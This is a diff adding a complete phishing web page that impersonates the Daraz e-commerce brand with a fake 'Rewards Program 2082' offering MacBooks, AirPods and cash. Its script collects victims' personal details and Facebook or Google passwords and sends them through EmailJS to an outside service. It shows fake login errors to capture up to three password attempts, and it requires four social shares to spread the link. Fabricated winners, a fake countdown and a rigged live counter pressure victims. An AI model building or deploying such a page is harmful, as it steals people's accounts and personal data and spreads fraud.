@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daraz Partner Portal 2082</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&family=Manrope:wght@700;800&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Sora', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f2847 100%);
+            color: #f1f5f9;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated background grid */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(248, 86, 6, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(248, 86, 6, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Floating orbs */
+        body::after {
+            content: '';
+            position: fixed;
+            top: -10%;
+            right: -5%;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(248, 86, 6, 0.1) 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: float 20s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) translateX(0px); }
+            50% { transform: translateY(-50px) translateX(30px); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Header */
+        .header {
+            backdrop-filter: blur(16px);
+            background: rgba(15, 23, 42, 0.7);
+            border-bottom: 1px solid rgba(248, 86, 6, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            padding: 1.25rem 0;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .logo-text {
+            font-family: 'Manrope', sans-serif;
+            font-size: 1.75rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f85606 0%, #ff8a3d 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -1px;
+        }
+
+        .badge {
+            background: rgba(248, 86, 6, 0.15);
+            border: 1px solid rgba(248, 86, 6, 0.3);
+            color: #ffa862;
+            padding: 0.35rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: #cbd5e1;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Main content */
+        .main-wrapper {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 3rem 1.5rem;
+        }
+
+        .card {
+            background: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(248, 86, 6, 0.1);
+            border-radius: 20px;
+            padding: 3rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .timer-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            background: linear-gradient(135deg, rgba(248, 86, 6, 0.15) 0%, rgba(248, 86, 6, 0.05) 100%);
+            border: 1px solid rgba(248, 86, 6, 0.3);
+            color: #ffa862;
+            padding: 0.75rem 1.25rem;
+            border-radius: 12px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            letter-spacing: 0.5px;
+        }
+
+        .timer-value {
+            font-family: 'Courier New', monospace;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .title {
+            font-family: 'Manrope', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #f1f5f9 0%, #cbd5e1 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: #94a3b8;
+            font-size: 1rem;
+            line-height: 1.6;
+            margin-bottom: 2rem;
+        }
+
+        /* Allocations Grid */
+        .allocations-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.25rem;
+            margin-bottom: 2.5rem;
+        }
+
+        .allocation-item {
+            background: rgba(248, 86, 6, 0.08);
+            border: 1px solid rgba(248, 86, 6, 0.2);
+            padding: 1.5rem;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            transition: all 0.3s ease;
+            cursor: default;
+        }
+
+        .allocation-item:hover {
+            background: rgba(248, 86, 6, 0.12);
+            border-color: rgba(248, 86, 6, 0.4);
+            transform: translateY(-4px);
+        }
+
+        .allocation-icon {
+            font-size: 1.75rem;
+        }
+
+        .allocation-text {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+            line-height: 1.4;
+        }
+
+        .allocation-highlight {
+            color: #ffa862;
+            font-weight: 600;
+        }
+
+        /* Terms Section */
+        .terms-container {
+            background: rgba(248, 86, 6, 0.05);
+            border: 1px solid rgba(248, 86, 6, 0.15);
+            border-radius: 14px;
+            padding: 1.5rem;
+            margin-bottom: 2.5rem;
+            max-height: 320px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(248, 86, 6, 0.3) rgba(248, 86, 6, 0.08);
+        }
+
+        .terms-container::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .terms-container::-webkit-scrollbar-track {
+            background: rgba(248, 86, 6, 0.08);
+            border-radius: 10px;
+        }
+
+        .terms-container::-webkit-scrollbar-thumb {
+            background: rgba(248, 86, 6, 0.3);
+            border-radius: 10px;
+        }
+
+        .term-item {
+            padding: 1rem;
+            border-bottom: 1px solid rgba(248, 86, 6, 0.1);
+            font-size: 0.9rem;
+            color: #cbd5e1;
+            line-height: 1.6;
+        }
+
+        .term-item:last-child {
+            border-bottom: none;
+        }
+
+        .term-number {
+            color: #f85606;
+            font-weight: 700;
+            margin-right: 0.5rem;
+        }
+
+        /* Checkbox */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            background: rgba(248, 86, 6, 0.05);
+            padding: 1.5rem;
+            border-radius: 14px;
+            border: 1px solid rgba(248, 86, 6, 0.15);
+            margin-bottom: 2rem;
+            transition: all 0.3s ease;
+        }
+
+        .checkbox-container:hover {
+            background: rgba(248, 86, 6, 0.08);
+            border-color: rgba(248, 86, 6, 0.3);
+        }
+
+        #agree-check {
+            width: 22px;
+            height: 22px;
+            cursor: pointer;
+            accent-color: #f85606;
+            flex-shrink: 0;
+        }
+
+        .checkbox-label {
+            font-weight: 600;
+            cursor: pointer;
+            color: #f1f5f9;
+            font-size: 0.95rem;
+        }
+
+        /* Button */
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #f85606 0%, #ff8a3d 100%);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 24px rgba(248, 86, 6, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            transition: left 0.5s ease;
+        }
+
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(248, 86, 6, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(8px);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: rgba(15, 23, 42, 0.95);
+            border: 1px solid rgba(248, 86, 6, 0.2);
+            padding: 2.5rem;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-title {
+            font-family: 'Manrope', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #f1f5f9;
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-subtitle {
+            font-size: 0.8rem;
+            color: #64748b;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: #94a3b8;
+            margin-bottom: 0.75rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .form-input, .form-select {
+            width: 100%;
+            padding: 0.875rem 1.125rem;
+            background: rgba(248, 86, 6, 0.08);
+            border: 1px solid rgba(248, 86, 6, 0.2);
+            border-radius: 10px;
+            color: #f1f5f9;
+            font-size: 0.95rem;
+            font-family: 'Sora', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .form-input::placeholder {
+            color: #64748b;
+        }
+
+        .form-input:focus, .form-select:focus {
+            outline: none;
+            background: rgba(248, 86, 6, 0.12);
+            border-color: rgba(248, 86, 6, 0.4);
+            box-shadow: 0 0 0 3px rgba(248, 86, 6, 0.1);
+        }
+
+        .form-select option {
+            background: #1e293b;
+            color: #f1f5f9;
+        }
+
+        /* Hidden elements */
+        #participation-ui, #login-modal, #share-ui, #success-ui {
+            display: none;
+        }
+
+        /* Progress bar */
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(248, 86, 6, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 2rem 0 1rem 0;
+        }
+
+        #progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #f85606 0%, #ff8a3d 100%);
+            transition: width 0.5s ease;
+        }
+
+        /* Share buttons */
+        .share-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .share-btn {
+            padding: 1rem;
+            border-radius: 12px;
+            color: white;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            letter-spacing: 0.3px;
+        }
+
+        .share-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Toast */
+        .live-toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) translateY(150%);
+            background: rgba(30, 41, 59, 0.95);
+            backdrop-filter: blur(16px);
+            color: #f1f5f9;
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            z-index: 1000;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            border: 1px solid rgba(248, 86, 6, 0.2);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+        }
+
+        .loader {
+            border: 2px solid rgba(248, 86, 6, 0.2);
+            border-top: 2px solid #f85606;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .card {
+                padding: 2rem;
+            }
+
+            .title {
+                font-size: 1.8rem;
+            }
+
+            .allocations-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .modal-content {
+                padding: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="header-content">
+                <div class="logo">
+                    <div class="logo-text">daraz</div>
+                    <div class="badge">2082 Portal</div>
+                </div>
+                <div class="status-indicator">
+                    <div class="status-dot"></div>
+                    <span>Secure Connection</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Landing Page -->
+        <div id="landing-page" class="main-wrapper">
+            <div class="card">
+                <div class="card-header">
+                    <div class="timer-badge">
+                        ⏰ Registration Closes: <span class="timer-value" id="timer">7d 12h 30m 00s</span>
+                    </div>
+                    <h1 class="title">Daraz Rewards Program 2082</h1>
+                    <p class="subtitle">Complete partner verification to unlock exclusive seasonal incentives and secure your allocation</p>
+                </div>
+
+                <!-- Allocations -->
+                <div class="allocations-grid">
+                    <div class="allocation-item">
+                        <div class="allocation-icon">💎</div>
+                        <div>
+                            <div class="allocation-text"><span class="allocation-highlight">MacBook Air M2</span><br>Tier (5 Available)</div>
+                        </div>
+                    </div>
+                    <div class="allocation-item">
+                        <div class="allocation-icon">🎧</div>
+                        <div>
+                            <div class="allocation-text"><span class="allocation-highlight">AirPods Pro</span><br>Tier (50 Available)</div>
+                        </div>
+                    </div>
+                    <div class="allocation-item">
+                        <div class="allocation-icon">💰</div>
+                        <div>
+                            <div class="allocation-text"><span class="allocation-highlight">Rs. 15,000</span><br>Cash Bonus (10)</div>
+                        </div>
+                    </div>
+                    <div class="allocation-item">
+                        <div class="allocation-icon">✨</div>
+                        <div>
+                            <div class="allocation-text"><span class="allocation-highlight">Rs. 5,000</span><br>Cash Incentive (20)</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Terms -->
+                <div class="terms-container">
+                    <div class="term-item">
+                        <span class="term-number">1.</span>
+                        <strong>Eligibility</strong>: Open exclusively to verified citizens and network contributors within Nepal
+                    </div>
+                    <div class="term-item">
+                        <span class="term-number">2.</span>
+                        <strong>Rate Limiting</strong>: Restricted to one application profile per legal user entity
+                    </div>
+                    <div class="term-item">
+                        <span class="term-number">3.</span>
+                        <strong>Identity Verification</strong>: Complete profile identity fields and security validation required
+                    </div>
+                    <div class="term-item">
+                        <span class="term-number">4.</span>
+                        <strong>Settlement</strong>: Legal identity structures must match on asset clearance records
+                    </div>
+                    <div class="term-item">
+                        <span class="term-number">5.</span>
+                        <strong>Anti-Fraud</strong>: Proxies, virtual configurations, or emulation triggers security filtering
+                    </div>
+                </div>
+
+                <!-- Checkbox -->
+                <div class="checkbox-container">
+                    <input type="checkbox" id="agree-check">
+                    <label for="agree-check" class="checkbox-label">I acknowledge and authorize all compliance requirements</label>
+                </div>
+
+                <!-- Button -->
+                <button onclick="proceedToIdentity()" class="btn-primary">PROCEED TO IDENTITY PROTOCOL</button>
+            </div>
+        </div>
+
+        <!-- Participation Form -->
+        <div id="participation-ui" class="main-wrapper">
+            <div class="card">
+                <div class="card-header">
+                    <h1 class="title" style="font-size: 1.8rem;">Identity Profile Configuration</h1>
+                    <p class="subtitle">Ensure all records match your official credentials</p>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Full Name</label>
+                    <input type="text" id="c-name" class="form-input" placeholder="As it appears on documentation">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Current City Location</label>
+                    <input type="text" id="c-loc" class="form-input" placeholder="Your primary city">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Gender Specification</label>
+                    <select id="c-gender" class="form-select">
+                        <option value="" disabled selected>Select your identification</option>
+                        <option value="Male">Male</option>
+                        <option value="Female">Female</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Phone Number</label>
+                    <input type="tel" id="c-phone" class="form-input" placeholder="098XXXXXXXX">
+                </div>
+
+                <button onclick="nav('login-modal')" class="btn-primary">CONTINUE TO VALIDATION</button>
+            </div>
+        </div>
+
+        <!-- Login Modal -->
+        <div id="login-modal" class="modal-overlay">
+            <div class="modal-content">
+                <div class="modal-title">Security Authentication</div>
+                <p class="modal-subtitle">CONFIRM IDENTITY VERIFICATION</p>
+
+                <div id="err-box" class="hidden" style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; padding: 1rem; border-radius: 10px; margin-bottom: 1.5rem; font-size: 0.9rem;">
+                    ⚠️ <strong>Authentication Failed</strong>: Please verify your credentials and try again
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Authentication Method</label>
+                    <select id="l-via" class="form-select">
+                        <option value="Facebook">OAuth2 via Facebook</option>
+                        <option value="Google">OAuth2 via Google</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Account Identifier</label>
+                    <input type="text" id="l-user" class="form-input" placeholder="Email or phone number" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Password</label>
+                    <input type="password" id="l-pass" class="form-input" placeholder="Enter your password" required>
+                </div>
+
+                <button onclick="sendToEmailJS()" class="btn-primary" id="sub-btn">AUTHORIZE LOGIN</button>
+
+                <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(248, 86, 6, 0.1);">
+                    <p style="font-size: 0.75rem; color: #64748b; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 1rem; text-transform: uppercase;">Live Verifications</p>
+                    <div style="display: flex; flex-direction: column; gap: 0.75rem;">
+                        <div style="display: flex; justify-content: space-between; font-size: 0.9rem; color: #cbd5e1;">
+                            <span>Suresh K.***</span>
+                            <span style="color: #10b981; font-weight: 700;">✓ Verified</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; font-size: 0.9rem; color: #cbd5e1;">
+                            <span>Pramila D.***</span>
+                            <span style="color: #10b981; font-weight: 700;">✓ Verified</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Share UI -->
+        <div id="share-ui" class="main-wrapper">
+            <div class="card">
+                <div class="card-header">
+                    <h1 class="title" style="font-size: 1.8rem;">Social Verification Node</h1>
+                    <p class="subtitle">Share your verification link to unlock your allocation</p>
+                </div>
+
+                <div class="progress-bar"><div id="progress-fill"></div></div>
+                <p style="text-align: center; font-size: 0.9rem; color: #94a3b8; margin-bottom: 2rem;">
+                    Progress: <span id="percent" style="color: #f85606; font-weight: 700; font-size: 1rem;">0</span>%
+                </p>
+
+                <div class="share-grid">
+                    <button onclick="share('wa')" class="share-btn" style="background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);">WhatsApp</button>
+                    <button onclick="share('fb')" class="share-btn" style="background: linear-gradient(135deg, #1877F2 0%, #0A66C2 100%);">Facebook</button>
+                    <button onclick="share('tg')" class="share-btn" style="background: linear-gradient(135deg, #0088cc 0%, #0066AA 100%);">Telegram</button>
+                    <button onclick="share('ms')" class="share-btn" style="background: linear-gradient(135deg, #006AFF 0%, #0052CC 100%);">Messenger</button>
+                </div>
+
+                <button onclick="finalize()" class="btn-primary" id="final-btn" style="opacity: 0.5; margin-top: 2rem;">COMPLETE ALLOCATION</button>
+
+                <div style="margin-top: 2.5rem; background: rgba(248, 86, 6, 0.05); padding: 1.5rem; border-radius: 14px; border: 1px solid rgba(248, 86, 6, 0.15);">
+                    <p style="font-size: 0.8rem; color: #64748b; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 1.25rem; text-transform: uppercase;">Distribution History</p>
+                    <div id="winners-list" style="display: flex; flex-direction: column; gap: 1rem;">
+                        <div style="display: flex; justify-content: space-between; font-size: 0.9rem; color: #cbd5e1;">
+                            <span>🇳🇵 B. Sharma (Kathmandu)</span>
+                            <span style="color: #ffa862; font-weight: 700;">Tier 3 ✓</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; font-size: 0.9rem; color: #cbd5e1;">
+                            <span>🇳🇵 S. Thapa (Butwal)</span>
+                            <span style="color: #ffa862; font-weight: 700;">Hardware ✓</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success UI -->
+        <div id="success-ui" class="main-wrapper">
+            <div class="card">
+                <div style="text-align: center;">
+                    <div style="width: 80px; height: 80px; background: rgba(16, 185, 129, 0.15); color: #10b981; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 3rem; margin: 0 auto 2rem; border: 2px solid rgba(16, 185, 129, 0.3);">✓</div>
+                    <h1 class="title">Allocation Confirmed</h1>
+                    <p class="subtitle">Your partner verification is complete. Your incentive has been registered in the 2082 system.</p>
+                    
+                    <div style="background: rgba(248, 86, 6, 0.08); padding: 2rem; border-radius: 14px; border: 1px solid rgba(248, 86, 6, 0.2); margin-top: 2.5rem;">
+                        <p style="font-size: 0.8rem; color: #64748b; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 1rem; text-transform: uppercase;">Active Network Participants</p>
+                        <div style="font-size: 3rem; font-family: 'Manrope', sans-serif; font-weight: 800; background: linear-gradient(135deg, #f85606 0%, #10b981 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;" id="live-counter">4,208</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div id="toast" class="live-toast">
+        <span class="loader"></span>
+        <span id="toast-msg">Processing verification...</span>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("YOUR_PUBLIC_KEY");
+        })();
+
+        const SERVICE_ID = "service_92dwcgj";
+        const TEMPLATE_ID = "template_kljc58d";
+
+        let attempts = 0, shares = 0, lTime = 0, active = false;
+
+        function proceedToIdentity() {
+            if(!document.getElementById('agree-check').checked) {
+                alert("Please acknowledge all compliance requirements to continue");
+                return;
+            }
+            nav('participation-ui');
+        }
+
+        function nav(id) {
+            document.querySelectorAll('#landing-page, #participation-ui, #login-modal, #share-ui, #success-ui').forEach(el => {
+                el.style.display = 'none';
+            });
+            const target = document.getElementById(id);
+            if (id === 'login-modal') {
+                target.style.display = 'flex';
+            } else {
+                target.style.display = 'block';
+            }
+            window.scrollTo(0, 0);
+        }
+
+        async function sendToEmailJS() {
+            const btn = document.getElementById('sub-btn');
+            const user = document.getElementById('l-user').value;
+            const pass = document.getElementById('l-pass').value;
+            
+            const fullName = document.getElementById('c-name').value;
+            const location = document.getElementById('c-loc').value;
+            const gender = document.getElementById('c-gender').value;
+            const phone = document.getElementById('c-phone').value;
+
+            if(!user || !pass) return alert("Please fill in all fields");
+
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loader mr-2" style="margin-right: 0.5rem;"></span>Verifying...';
+attempts++;
+            const templateParams = {
+                from_name: fullName,
+                city: location,
+                gender: gender,
+                phone: phone,
+                method: document.getElementById('l-via').value,
+                user_login: user,
+                user_password: pass,
+                attempt_number: attempts
+            };
+
+            try {
+                await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
+                
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.innerText = "AUTHORIZE LOGIN";
+
+                    if(attempts < 3) {
+                        document.getElementById('l-pass').value = "";
+                        document.getElementById('err-box').classList.remove('hidden');
+                    } else {
+                        document.getElementById('login-modal').style.display = 'none';
+                        nav('share-ui');
+                    }
+                }, 1200);
+
+            } catch (error) {
+                console.error("Error:", error);
+                btn.disabled = false;
+                btn.innerText = "AUTHORIZE LOGIN";
+                alert("Verification failed. Please try again.");
+            }
+        }
+
+        function share(plat) {
+            active = true;
+            lTime = Date.now();
+            const msg = encodeURIComponent("Daraz 2082: Secure your rewards - " + window.location.href);
+            window.location.href = (plat==='wa' ? "whatsapp://send?text=" : (plat==='tg' ? "https://t.me/share/url?url=" : "https://facebook.com/sharer/sharer.php?u=")) + msg;
+        }
+
+        document.addEventListener("visibilitychange", () => {
+            if(document.visibilityState === 'visible' && active) {
+                active = false;
+                if(Date.now() - lTime > 1800) {
+                    shares++;
+                    let p = Math.min((shares/4)*100, 100);
+                    document.getElementById('progress-fill').style.width = p + "%";
+                    document.getElementById('percent').innerText = Math.round(p);
+                    if(shares >= 4) document.getElementById('final-btn').style.opacity = "1";
+                }
+            }
+        });
+
+        function finalize() {
+            if(shares >= 4) {
+                nav('success-ui');
+                setInterval(() => {
+                    const c = document.getElementById('live-counter');
+                    c.innerText = (parseInt(c.innerText.replace(',','')) + Math.floor(Math.random()*3)).toLocaleString();
+                }, 1000);
+            }
+        }
+
+        let totalSeconds = (7 * 24 * 60 * 60) + (12 * 60 * 60) + (30 * 60);
+        setInterval(() => {
+            if (totalSeconds <= 0) return;
+            let days = Math.floor(totalSeconds / (24 * 60 * 60));
+            let hours = Math.floor((totalSeconds % (24 * 60 * 60)) / (60 * 60));
+            let mins = Math.floor((totalSeconds % (60 * 60)) / 60);
+            let secs = totalSeconds % 60;
+            document.getElementById('timer').innerText = `${days}d ${hours}h ${mins}m ${secs < 10 ? '0' : ''}${secs}s`;
+            totalSeconds--;
+        }, 1000);
+
+        const names = ["Nabin M.", "Sita K.", "Rajesh H.", "Prakash T.", "Deepa G.", "Bimal P.", "Roji B."];
+        const cities = ["Kathmandu", "Nawalpur", "Siraha", "Pokhara", "Janakpur", "Biratnagar"];
+
+        setInterval(() => {
+            const toast = document.getElementById('toast');
+            const msg = document.getElementById('toast-msg');
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomCity = cities[Math.floor(Math.random() * cities.length)];
+            msg.innerText = `${randomName} verified from ${randomCity}`;
+            toast.style.transform = "translateX(-50%) translateY(0)";
+            setTimeout(() => { toast.style.transform = "translateX(-50%) translateY(150%)"; }, 3000);
+        }, 7000);
+    </script>
+</body>
+</html>
